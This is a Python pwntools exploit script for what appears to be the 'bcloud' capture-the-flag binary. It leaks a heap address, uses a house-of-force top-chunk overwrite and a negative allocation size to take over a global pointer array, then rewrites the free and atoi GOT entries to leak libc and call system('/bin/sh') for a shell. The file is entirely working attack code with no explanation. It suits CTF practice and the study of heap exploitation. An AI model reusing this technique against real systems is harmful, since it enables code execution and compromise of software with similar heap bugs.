# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
r = process('./bcloud.9a3bd1d30276b501a51ac8931b3e43c4')

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
binn = ELF("./bcloud.9a3bd1d30276b501a51ac8931b3e43c4")


print(str(r.proc.pid))

def alloc(size):
    # r.recvuntil('Action:')
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK\n')


# r.recv(timeout=0.1)
r.recvuntil('Input your name:\n')

r.send('A'*(0x40-4)+'BCDE')

raw = r.recvuntil('!')
# ad = r.recv(4).ljust(4, "\x00")
heap_addr = u32(raw[-2:-6:-1][::-1])-0x8
log.info("leak addr: " + hex(heap_addr)) # leak addr: 0x804c008

r.recvuntil('Org:\n')
r.send('B'*(0x40-4)+'BCDE')
r.recvuntil('Host:\n')
r.send('\xff'*4 + 'C'*(0x40-8)+'BCDE')

# evil = 0x0804B120-(0x804c0d8)-0x8
evil = 0x0804B120-(heap_addr+0xd8)-0x8

r.recvuntil('option--->>\n')
r.sendline('1')
r.recvuntil('Input the length of the note content:\n')
# r.sendline('-4032')
r.sendline(str(evil))
r.recvuntil('Input the content:\n')
r.sendline('')

r.recvuntil('option--->>\n')
r.sendline('1')
r.recvuntil('Input the length of the note content:\n')
r.sendline('10')
r.recvuntil('Input the content:\n')
r.sendline(p32(binn.got['free'])+p32(binn.got['atoi'])) # ptr





r.recvuntil('option--->>\n')
r.sendline('3')
r.recvuntil('Input the id:\n')
r.sendline('2')
r.recvuntil('Input the new content:\n')
r.sendline(p32(binn.plt['puts']))
# r.send

# r.recvuntil('option--->>\n')
# r.sendline('1')
# r.recvuntil('Input the length of the note content:\n')
# r.sendline('4')
# r.recvuntil('Input the content:\n')
# r.send(p32(binn.got['atoi'])) # 3

r.recvuntil('option--->>\n')
r.sendline('1')
r.recvuntil('Input the length of the note content:\n')
r.sendline('8')
r.recvuntil('Input the content:\n') # 4
r.sendline("/bin/sh")


r.recvuntil('option--->>\n')
r.sendline('4')
r.recvuntil('Input the id:\n')
r.sendline('3')
raw = u32(r.recv(4))
libc_addr = raw- 0x2d250
print("----libc addr: ", hex(libc_addr)) #0xf7e14000
sys_addr = libc_addr+0x3ada0
# res = r.rec


r.recvuntil('option--->>\n')
r.sendline('3')
r.recvuntil('Input the id:\n')
r.sendline('2')
r.recvuntil('Input the new content:\n')
r.sendline(p32(sys_addr))



r.recvuntil('option--->>\n')
r.sendline('4')
r.recvuntil('Input the id:\n')
r.sendline('4')
r.sendline('whoami')

gdb.attach(r, """
heapinfo
x/20gx 0x804c000

x/10gx 0x804c0d8
x/10wx 0x804b120

""");
print(str(r.proc.pid))

r.interactive()

# gdb-peda$ p/x 0x0804B120-0x804c0d8-0x8
# $1 = 0xfffff040